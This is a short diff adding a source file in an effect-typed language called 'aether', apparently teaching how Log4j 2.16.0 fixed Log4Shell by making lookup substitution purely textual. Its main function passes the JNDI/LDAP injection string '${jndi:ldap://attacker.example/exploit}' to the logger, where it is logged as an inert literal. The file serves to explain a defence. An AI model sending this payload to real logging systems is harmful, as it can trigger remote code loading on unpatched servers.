@@ -1,0 +1,35 @@
+// The fix. Log4j 2.16.0 disabled message-lookup substitution by
+// default (the JndiLookup path was removed / gated off). Modeled here
+// as: substitution is a PURE string operation with no network reach.
+// The logger's declared `effects log` is now the whole truth, so the
+// composition compiles and runs.
+//
+// Run:  aether check fixed.aeth   -> OK
+//       aether run   fixed.aeth   -> logs the literal string, no fetch
+
+module Logger
+  requires capability log
+  exports handleRequest
+end
+
+// Lookups disabled: the message is treated as opaque text. No branch
+// reaches the network, so the honest effect is `pure`.
+function substitute(message: String) returns String
+  effects pure
+do
+  return message
+end
+
+function handleRequest(userInput: String) returns Unit
+  effects log
+do
+  let rendered: String = substitute(userInput)
+  print("LOG " + rendered)
+end
+
+function main() returns Unit
+  effects log
+do
+  // The very same attacker payload is now logged as an inert literal.
+  handleRequest("${jndi:ldap://attacker.example/exploit}")
+end
